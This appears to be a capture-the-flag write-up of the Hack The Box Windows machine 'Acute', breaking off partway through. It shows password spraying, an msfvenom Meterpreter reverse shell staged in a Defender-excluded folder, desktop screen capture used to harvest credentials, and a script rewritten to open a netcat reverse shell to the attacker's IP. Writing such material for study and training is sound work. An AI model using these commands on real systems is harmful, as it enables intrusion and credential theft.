---
title: HTB: Acute
url: https://0xdf.gitlab.io/2022/07/16/htb-acute.html
date: 2022-07-16T13:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: hackthebox, ctf, htb-acute, nmap, feroxbuster, powershell-web-access, exiftool, meterpreter, metasploit, msfvenom, defender, defender-bypass-directory, screenshare, credentials, powershell-runas, powershell-configuration, oscp-like-v2
---

![Acute](https://0xdfimages.gitlab.io/img/acute-cover.png)

Acute is a really nice Windows machine because there’s nothing super complex about the attack paths. Rather, it’s just about manuverting from user to user using shared creds and privilieges available to make the next step. It’s a pure Windows box. There’s two hosts to pivot between, limited PowerShell configurations, and lots of enumeration.

## Box Info

| Name | [Acute](https://hackthebox.com/machines/acute)  [Acute](https://hackthebox.com/machines/acute) [Play on HackTheBox](https://hackthebox.com/machines/acute) |
| --- | --- |
| Release Date | [12 Feb 2022](https://twitter.com/hackthebox_eu/status/1547264627574185986) |
| Retire Date | 16 Jul 2022 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Acute |
| Radar Graph | Radar chart for Acute |
| First Blood User | 01:20:24[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 04:29:58[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| Creator | [dmw0ng dmw0ng](https://app.hackthebox.com/users/610173) |

## Recon

### nmap

`nmap` finds a single open TCP port, HTTPS (443):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.145
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-06 00:39 UTC
Nmap scan report for 10.10.11.145
Host is up (0.086s latency).
Not shown: 65534 filtered ports
PORT    STATE SERVICE
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 13.54 seconds
oxdf@hacky$ nmap -p 443 -sCV 10.10.11.145
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-06 00:42 UTC
Nmap scan report for 10.10.11.145
Host is up (0.085s latency).

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=atsserver.acute.local
| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
| Not valid before: 2022-01-06T06:34:58
|_Not valid after:  2030-01-04T06:34:58
|_ssl-date: 2022-06-06T00:42:38+00:00; -6s from scanner time.
| tls-alpn: 
|_  http/1.1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -6s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.46 seconds

```

No hint at OS beyond Windows. There is a certificate with the name `atsserver.acute.local`. I’ll add that and `acute.local` and `acute` to my `/etc/hosts` file:

```
10.10.11.145 atsserver.acute.local acute.local

```

I’ll try fuzzing for other subdomains of `acute.local` with `wfuzz`, but not find any.

### Website - TCP 443

#### Site

Visiting `https://acute.local` returns a 404:

![image-20220605204704019](https://0xdfimages.gitlab.io/img/image-20220605204704019.png)

But visiting `https://atsserver.acute.local` returns a site for a healthcare professional development company:

[![image-20220605204759384](https://0xdfimages.gitlab.io/img/image-20220605204759384.png)](https://0xdfimages.gitlab.io/img/image-20220605204759384.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220605204759384.png)

Most of the links on the page either point back to this page, or 404. But the “About Us” link at the top goes to `/about.html`:

[![image-20220605205058204](https://0xdfimages.gitlab.io/img/image-20220605205058204.png)](https://0xdfimages.gitlab.io/img/image-20220605205058204.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220605205058204.png)

This page is largely uninteresting as well, with all but one of the links pointing back to the root, or at this page. At the top right, there’s a link to “New Starter Forms” which downloads `New_Starter_CheckList_v7.docx`.

There’s also a section that lists the users for the site:

![image-20220605205327299](https://0xdfimages.gitlab.io/img/image-20220605205327299.png)

I’ll record these users’ names, and look for some way to figure out how to convert them to usernames.

#### Tech Stack

The HTTP response headers show `ASP.NET`, so I’ll keep an eye out for `.aspx` (or maybe `.asp`) pages:

```

HTTP/2 200 OK
Content-Type: text/html
Last-Modified: Tue, 11 Jan 2022 19:55:13 GMT
Accept-Ranges: bytes
Etag: "60c8ed25257d81:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Tue, 07 Jun 2022 01:15:42 GMT
Content-Length: 77254

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x aspx` given the HTTP response headers:

```

oxdf@hacky$ feroxbuster -u https://atsserver.acute.local/ -x aspx -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://atsserver.acute.local/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [aspx]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        2l       10w      167c https://atsserver.acute.local/aspnet_client => https://atsserver.acute.local/aspnet_client/
200      GET     1346l     5905w    93397c https://atsserver.acute.local/
301      GET        2l       10w      178c https://atsserver.acute.local/aspnet_client/system_web => https://atsserver.acute.local/aspnet_client/system_web/
[####################] - 3m    159504/159504  0s      found:3       errors:0      
[####################] - 2m     53168/53168   316/s   https://atsserver.acute.local/ 
[####################] - 2m     53168/53168   316/s   https://atsserver.acute.local/aspnet_client 
[####################] - 2m     53168/53168   331/s   https://atsserver.acute.local/aspnet_client/system_web 

```

Nothing interesting.

## Shell as edavies on Acute-PC01

### New\_Starter\_Checklist\_v7.docx

#### Contents

The document is three pages of instructions for a new joiner to the organization:

[![](https://0xdfimages.gitlab.io/img/New_Starter_CheckList_v7.png)](https://0xdfimages.gitlab.io/img/New_Starter_CheckList_v7.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/New_Starter_CheckList_v7.png)

There are a bunch of bits of information to capture:
- There’s two links for staff induction pages, but both return 404:

  ![image-20220607090008793](https://0xdfimages.gitlab.io/img/image-20220607090008793.png)

</picture>
- The “IT overview” section gives a default password, and even mentions that some staff are not changing it:

  ![image-20220607095832329](https://0xdfimages.gitlab.io/img/image-20220607095832329.png)

</picture>
- The “Initial Probation Meeting (For Academic staff on Probation only)” section has a subtle but important reference. PWSA is likely PowerShell Web Access, and it’s talking about restrictions via a session called `dc_manage`:

  ![image-20220607122923417](https://0xdfimages.gitlab.io/img/image-20220607122923417.png)

</picture>
- There’s a reference to “remote training” in “Induction meetings with management staff”. The link goes to `https://atsserver.acute.local/Acute_Staff_Access`. I read this as saying the employee needs training on how to use the remote access at the given link (rather than that the training is remote about an unspecified topic):

  ![image-20220607123106269](https://0xdfimages.gitlab.io/img/image-20220607123106269.png)

</picture>
- At the bottom it mention Lois, who is likely Lois Hopkins from the list of users above:

  ![image-20220607123201612](https://0xdfimages.gitlab.io/img/image-20220607123201612.png)

</picture>

#### Metadata

The Word document metadata has some additional clues that will prove useful:

```

oxdf@hacky$ exiftool New_Starter_CheckList_v7.docx 
ExifTool Version Number         : 11.88
File Name                       : New_Starter_CheckList_v7.docx
...[snip]...
Creator                         : FCastle
Description                     : Created on Acute-PC01
Last Modified By                : Daniel
Revision Number                 : 8
Last Printed                    : 2021:01:04 15:54:00Z
Create Date                     : 2021:12:08 14:21:00Z
Modify Date                     : 2021:12:22 00:39:00Z
Template                        : Normal.dotm
Total Edit Time                 : 2.6 hours
Pages                           : 3
Words                           : 886
Characters                      : 5055
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 42
Paragraphs                      : 11
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 : 
Company                         : University of Marvel
Links Up To Date                : No
Characters With Spaces          : 5930
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 16.0000

```

The creator is FCastle. That doesn’t match up nicely with any name on the site, but it does lend a hint at the username format of first initial plus last name. There’s also a description that says “Created on Acute-PC01”, which gives a hostname.

### PowerShell Web Access

#### Find Creds

The link for remote access is an instance of PowerShell Web Access (PSWA):

![image-20220607123956655](https://0xdfimages.gitlab.io/img/image-20220607123956655.png)

From the users on the webpage, I’ll generate the following usernames using the format from the metadata:

```

awallace
chall
edavies
imonks
jmorgan
lhopkins

```

I’ve also got the default password, “Password1!”. While I could set up something like `hydra` to brute force them all, it’ll be just as fast to just try them.

PWSA also requires a computer name. I’ll start with atsserver.

For all but one, the result looked like this:

![image-20220607124341614](https://0xdfimages.gitlab.io/img/image-20220607124341614.png)

However, for edavies, it was different:

![image-20220607124356392](https://0xdfimages.gitlab.io/img/image-20220607124356392.png)

That’s an information leak that the username/password worked, but the computer was wrong.

#### Find Computer

I’ll try again with the same creds, but use the computer name from the metadata, “Acute-PC01”. It works:

![image-20220607124505230](https://0xdfimages.gitlab.io/img/image-20220607124505230.png)

### Meterpreter

#### Strategy

Enumerating through this web access console is a bit of a pain. When I go to run [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) in a bit, the output is messed up, and the history too short to see it all. I’m going to use this access to get a reverse shell.

Typically I try to avoid using Meterpreter on HTB machines because (a) I like to understand what’s going on to better learn, and (b) many people reading writeups are practicing for exams where Meterpreter is not allowed / limited.

That said, there’s a step coming that is made possible (or at least significantly easier) with Meterpreter, so I’ll use that here.

#### Generate Payload

I’ll use `msfvenom` to generate a reverse shell using Meterpreter in an executable format:

```

oxdf@hacky$ msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=4444 LHOST=10.10.14.6 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe

```

I don’t have to worry about any obfuscation or encoding, as I will find in a minute a Defender-free folder to stage from. I’m using a high port so I don’t have to start `msfconsole` as root.

#### Start Listener

I’ll run `msfconsole` to start Metasploit, and then run `use exploit/multi/handler` to get the “exploit” that just listens for a reverse connection and starts a session with it.

I’ll set the `payload`, `lhost`a and `lport` to match what I used in `msfvenom`, and then `run`:

```

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.6:4444

```

#### Upload and Execution - Fail

I’ll use a Python webserver to host the executable, and fetch it into `C:\ProgramData` with `wget`:

```

PS C:\programdata> wget 10.10.14.6/rev.exe -outfile r.exe

```

Once it’s there, I’ll run it:

```

PS C:\programdata> .\r.exe
Program 'r.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted software.
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException 
    + FullyQualifiedErrorId : NativeCommandFailed 

```

It fails because of AV.

#### Defender Bypass

`C:\Utils` looks empty, but running with `-force` shows a single hidden file:

```

PS C:\Utils> ls -force

    Directory: C:\Utils

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-h--        12/21/2021   6:41 PM            148 desktop.ini
 
PS C:\Utils> 
cat .\desktop.ini
[.ShellClassInfo]
InfoTip=Directory for Testing Files without Defender

```

The registry confirms this:

```

PS C:\Utils> 
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
    C:\Utils    REG_DWORD    0x0
    C:\Windows\System32    REG_DWORD    0x0

```

There are actually two, but I can’t write to `C:\Windows\System32` as a non-privileged user.

#### Upload and Execution

I’ll upload the reverse shell again, this time into `C:\Utils`:

```

PS C:\Utils> wget 10.10.14.6/rev.exe -outfile r.exe

```

Once it’s there, I’ll run it:

```

PS C:\Utils> .\r.exe

```

It hangs there without returning, but at `msfconsole`:

```

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Sending stage (200774 bytes) to 10.10.11.145
[*] Meterpreter session 1 opened (10.10.14.6:4444 -> 10.10.11.145:49857) at 2022-06-07 17:39:49 +0000

meterpreter >

```

#### PowerShell

Meterpreter has a PowerShell module that typically can load the .NET Common Language Runtime (CLR) and interact with the Windows API. It’s invoked with `load powershell`. For some reason, it fails here:

```

meterpreter > load powershell
Loading extension powershell...
[-] Failed to load extension: No response was received to the core_loadlib request.

```

Instead, to drop to a PowerShell shell, I’ll run `shell` (which spawns a `cmd.exe` process), and then `powershell` from there:

```

meterpreter > shell
Process 4836 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19044.1466]
(c) Microsoft Corporation. All rights reserved.

C:\Utils>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Utils>

```

## Execution as imonk on ATSSERVER

### Enumeration

#### Container / VM

`ipconfig` shows the IP for this host is 172.16.22.2:

```

PS C:\Utils> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::9513:4361:23ec:64fd%14
   IPv4 Address. . . . . . . . . . . : 172.16.22.2
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.22.1

```

The gateway, and likely host machine, is 172.16.22.1. The only other hostname I’ve seen is ATSSERVER, which `ping` shows is that .1 host:

```

PS C:\Utils> ping atsserver

Pinging ATSSERVER.acute.local [172.16.22.1] with 32 bytes of data:
Reply from 172.16.22.1: bytes=32 time<1ms TTL=128
Reply from 172.16.22.1: bytes=32 time<1ms TTL=128
Reply from 172.16.22.1: bytes=32 time<1ms TTL=128
Reply from 172.16.22.1: bytes=32 time<1ms TTL=128

Ping statistics for 172.16.22.1:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms

```

#### File System

The host itself is pretty empty. There are other users on the box:

```

PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        12/21/2021   1:01 PM                administrator.ACUTE
d-----        12/22/2021   1:26 AM                edavies
d-----        12/21/2021  10:50 PM                jmorgan
d-----        11/19/2021   9:29 AM                Natasha
d-r---        11/18/2020  11:43 PM                Public

```

But nothing interesting I can access.

#### WinPEAS

I’ll grab the latest copy of WinPEAS from the [release page](https://github.com/carlospolop/PEASS-ng/releases), upload that to Acute, and run it:

```

PS C:\Utils> .\wp.exe
...[snip]...

```

There’s a section that’s easy to miss, but very interesting:

![image-20220607135154606](https://0xdfimages.gitlab.io/img/image-20220607135154606.png)

It’s saying there’s an RDP session. This could also be seen without WinPeas by running `qwinsta /server:127.0.0.1`:

```

PS C:\Utils> qwinsta /server:127.0.0.1
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 
 console           edavies                   1  Active 

```

I believe (please correct me if I’m getting this wrong) that it’s not actually detecting RDP, but rather an interactive logged on session as edavies. Because it’s interactive, I know it’s not my session. WinPeas is using `WTSEnumerateSessionsEx` ([docs](https://docs.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsenumeratesessionsexa), [source](https://github.com/carlospolop/PEASS-ng/blob/585fcc33b20bc68763ed15bcf6b9d49c507aadc2/winPEAS/winPEASexe/winPEAS/Info/UserInfo/UserInfoHelper.cs#L169)), which I believe is what `qwinsta` uses as well. This reports on sessions on this host, and there isn’t anyone RDPed into this host. Still, knowing edavies is logged in is a good clue to proceed on.

### screenshare

Meterpreter has a `screenshare` function that takes screenshots of the active desktop at a regular interval, and allows the attacker to watch like a live stream.

On running it, it pops up an HTML page in Firefox that is showing the desktop:

![image-20220607135827436](https://0xdfimages.gitlab.io/img/image-20220607135827436.png)

After a few minutes, a PowerShell terminal opens as edavies. This user creates a PowerShell credential object, and uses it to connect to the atsserver machine as the imonks user:

[![image-20220607140713237](https://0xdfimages.gitlab.io/img/image-20220607140713237.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220607140713237.png)

There are several important bits here:
- The user is acute\imonks with the passwrd “w3\_4R3\_th3\_f0rce.”.
- edavies is trying to authenticate to ATSSERVER.
- edavies is trying to use the `dc_manage` configuration mentioned above.

### Execution

#### Failed PSSesssion

I’ll create a credential object for use on ATSSERVER:

```

PS C:\Utils> $pass = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
PS C:\Utils> $cred = New-Object System.Management.Automation.PSCredential("ACUTE\imonks", $pass)

```

If I try to initiate a PSSession on the remote host, it rejects as Access Denied:

```

PS C:\Utils> Enter-PSSession -ComputerName ATSSERVER -Credential $cred
Enter-PSSession : Connecting to remote server ATSSERVER failed with the following error message : Access is denied. 
For more information, see the about_Remote_Troubleshooting Help topic.
At line:1 char:1
+ Enter-PSSession -ComputerName ATSSERVER -Credential $cred
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (ATSSERVER:String) [Enter-PSSession], PSRemotingTransportException
    + FullyQualifiedErrorId : CreateRemoteRunspaceFailed

```

I noticed the references to using the `dc_manage` configuration. It’s possible that imonks is only allowed to connect with that config. Specifying that gives a different error message:

```

PS C:\Utils> Enter-PSSession -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage
Enter-PSSession : The term 'Measure-Object' is not recognized as the name of a cmdlet, function, script file, or 
operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try 
again.
At line:1 char:1
+ Enter-PSSession -ComputerName ATSSERVER -Credential $cred -Configurat ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Measure-Object:String) [Enter-PSSession], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

```

It’s failing because imonks doesn’t have access to the `Measure-Object` cmdlet. This could be an issue with the `dc_manage` configuration, or perhaps an issue with the [Kerberos Double Hop](https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/enter-pssession-cmdlet-fails-psmodulepath-variable) (or both).

#### Invoke-Command

A simpler attempt is to just run a command using `Invoke-Command`. This works:

```

PS C:\Utils> Invoke-Command -ScriptBlock { whoami } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
acute\imonks

```

This is enough to read `user.txt`:

```

PS C:\Utils> Invoke-Command -ScriptBlock { cat C:\users\imonks\desktop\user.txt } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
9876b84d3f317ff5c0893e18477e1c13

```

## Shell as jmorgan on Acute-PC01

### Enumeration

#### Limited Shell

To enumerate further, first I need to understand what commands I have access to in this configuration. `Get-Command` will tell me that:

```

PS C:\Utils> Invoke-Command -ScriptBlock { Get-Command } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred

CommandType     Name                                               Version    Source               PSComputerName      
-----------     ----                                               -------    ------               --------------      
Cmdlet          Get-Alias                                          3.1.0.0    Microsoft.PowerSh... ATSSERVER           
Cmdlet          Get-ChildItem                                      3.1.0.0    Microsoft.PowerSh... ATSSERVER           
Cmdlet          Get-Command                                        3.0.0.0    Microsoft.PowerSh... ATSSERVER           
Cmdlet          Get-Content                                        3.1.0.0    Microsoft.PowerSh... ATSSERVER           
Cmdlet          Get-Location                                       3.1.0.0    Microsoft.PowerSh... ATSSERVER           
Cmdlet          Set-Content                                        3.1.0.0    Microsoft.PowerSh... ATSSERVER           
Cmdlet          Set-Location                                       3.1.0.0    Microsoft.PowerSh... ATSSERVER           
Cmdlet          Write-Output                                       3.1.0.0    Microsoft.PowerSh... ATSSERVER

```

I’ll also look at `Get-Alias` to see what are set:

```

PS C:\Utils> Invoke-Command -ScriptBlock { Get-Alias } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred

CommandType     Name                                               Version    Source               PSComputerName      
-----------     ----                                               -------    ------               --------------      
Alias           cat -> Get-Content                                                                 ATSSERVER           
Alias           cd -> Set-Location                                                                 ATSSERVER           
Alias           echo -> Write-Output                                                               ATSSERVER           
Alias           ls -> Get-ChildItem                                                                ATSSERVER           
Alias           pwd -> Get-Location                                                                ATSSERVER           
Alias           sc -> Set-Content                                                                  ATSSERVER           
Alias           type -> Get-Content                                                                ATSSERVER

```

#### Program Files

It’s always worth looking at installed programs in `C:\program files` (and `C:\program files (x86)`):

```

PS C:\Utils> Invoke-Command -ScriptBlock { ls '\program files' } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred

    Directory: C:\program files

Mode                 LastWriteTime         Length Name                               PSComputerName                    
----                 -------------         ------ ----                               --------------                    
d-----        21/12/2021     00:04                common files                       ATSSERVER                         
d-----        21/12/2021     00:11                Hyper-V                            ATSSERVER                         
d-----        15/09/2018     08:12                internet explorer                  ATSSERVER                         
d-----        01/02/2022     19:41                keepmeon                           ATSSERVER                         
d-----        21/12/2021     00:04                VMware                             ATSSERVER                         
d-----        20/12/2021     21:19                Windows Defender                   ATSSERVER                         
d-----        20/12/2021     21:12                Windows Defender Advanced Threat   ATSSERVER                         
                                                  Protection
d-----        21/12/2021     14:13                WindowsPowerShell                  ATSSERVER

```

`Hyper-V` is likely the virtualization technology to get nested Windows hosts like this. `keepmeon` is not something I’m familiar with.

Unfortunately, imonks is not able to access it:

```

PS C:\Utils> Invoke-Command -ScriptBlock { ls '\program files\keepmeon' } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
Access to the path 'C:\program files\keepmeon' is denied.
    + CategoryInfo          : PermissionDenied: (C:\program files\keepmeon:String) [Get-ChildItem], UnauthorizedAccess 
   Exception
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : ATSSERVER

```

#### Desktop

In addition to `user.txt`, there’s another file on imonk’s desktop:

```

PS C:\Utils> Invoke-Command -ScriptBlock { ls ..\desktop } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred

    Directory: C:\Users\imonks\desktop

Mode                 LastWriteTime         Length Name                               PSComputerName                    
----                 -------------         ------ ----                               --------------                    
-ar---        05/06/2022     22:16             34 user.txt                           ATSSERVER                         
-a----        11/01/2022     18:04            602 wm.ps1                             ATSSERVER

```

It has credentials for jmorgan back on Acute-PC01:

```

$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'
$passwd = $securepasswd | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds

```

#### jmorgan

I’m not able to get to the DC to get information about jmorgan:

```

PS C:\Utils> net user jmorgan /domain
net user jmorgan /domain
The request will be processed at a domain controller for domain acute.local.

System error 1722 has occurred.

The RPC server is unavailable.

```

But, it does seem that domain user is in the local administrator group for Acute-PC01:

```

PS C:\Utils> net localgroup Administrators
net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
ACUTE\Domain Admins
ACUTE\jmorgan
Administrator
The command completed successfully.

```

That explains why they may be able to run `Get-Volume` whereas edavies cannot:

```

PS C:\Utils> Get-Volume
Get-Volume : Cannot connect to CIM server. Access denied 
At line:1 char:1
+ Get-Volume
+ ~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (MSFT_Volume:String) [Get-Volume], CimJobException
    + FullyQualifiedErrorId : CimJob_BrokenCimSession,Get-Volume

```

### Execution

#### Failure #1

My initial thought is to use that `$securepasswd` to get a `PSCredential` object for jmorgan on Acute-PC01:

```

PS C:\Utils> $securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'                                   
PS C:\Utils> $passwd = $securepasswd | ConvertTo-SecureString
ConvertTo-SecureString : Key not valid for use in specified state.
At line:1 char:27                                   
+ $passwd = $securepasswd | ConvertTo-SecureString
+                           ~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (:) [ConvertTo-SecureString], CryptographicException
    + FullyQualifiedErrorId : ImportSecureString_InvalidArgument_CryptographicError,Microsoft.PowerShell.Commands.ConvertToSecureStringCommand 

```

That’s because these secure password strings are encrypted with information only available on the computer it was encrypted with as the user it was encrypted with.

#### Failure #2

Then perhaps I can decrypt the password on ATSSERVER as imonks. The code does work there:

```

PS C:\Utils> Invoke-Command -ScriptBlock { C:\users\imonks\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred

PSComputerName       : ATSSERVER
RunspaceId           : fc350a1c-6b96-49a3-8901-0a3bf4c0b6c2
ObjectId             : {1}\\ACUTE-PC01\root/Microsoft/Windows/Storage/Providers_v2\WSP_Volume.ObjectId="{8ccfebca-48c0-
                       11ec-9ffe-806e6f6e6963}:VO:\\?\Volume{0eed1261-0000-0000-0000-100000000000}\"
PassThroughClass     : 
PassThroughIds       : 
PassThroughNamespace : 
PassThroughServer    : 
UniqueId             : \\?\Volume{0eed1261-0000-0000-0000-100000000000}\
AllocationUnitSize   : 4096
DedupMode            : 4
DriveLetter          : 
DriveType            : 3
FileSystem           : NTFS
...[snip]...

```

I’ll put all the commands I need into the `ScriptBlock`, and get the plaintext password. Unfortunately, it doesn’t work:

```

PS C:\Utils> Invoke-Command -ScriptBlock { $securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c
0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'; $passwd = $securepasswd | ConvertTo-SecureString; $creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd); $creds.GetNetworkCredential().Password } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
The term 'ConvertTo-SecureString' is not recognized as the name of a cmdlet, function, script file, or operable 
program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (ConvertTo-SecureString:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
    + PSComputerName        : ATSSERVER
  
The term 'New-Object' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the 
spelling of the name, or if a path was included, verify that the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (New-Object:String) [], CommandNotFoundException                                                                                                                     
    + FullyQualifiedErrorId : CommandNotFoundException                                              
    + PSComputerName        : ATSSERVER
                       
You cannot call a method on a null-valued expression.
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : InvokeMethodOnNull
    + PSComputerName        : ATSSERVER

```

Because `ConvertTo-SecureString` isn’t defined in this profile, I can’t run it. It is interesting to note that I was able to run it from within a script.

#### Modify Script

I’ve got access to `Get-Content` (`cat`) and `Set-Content` (`sc`), so I can relatively easily create a new script. I could have it call `r.exe` again (since I’m executing on the same box I’m already on), but I don’t want to drop out of my PowerShell session to start a new listener. I’ll upload `nc64.exe` to `C:\utils` and have the script call that:

```

PS C:\Utils> Invoke-Command -ScriptBlock { ((cat ..\desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'C:\utils\nc64.exe -e cmd 10.10.14.6 443') | sc -Path ..\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred

```

Now the script creates a reverse shell to me:

```

PS C:\Utils> Invoke-Command -ScriptBlock { cat ..\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'
$passwd = $securepasswd | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
Invoke-Command -ScriptBlock {C:\utils\nc64.exe -e cmd 10.10.14.6 443} -ComputerName Acute-PC01 -Credential $creds

```

I’ll start `nc` and run it:

```

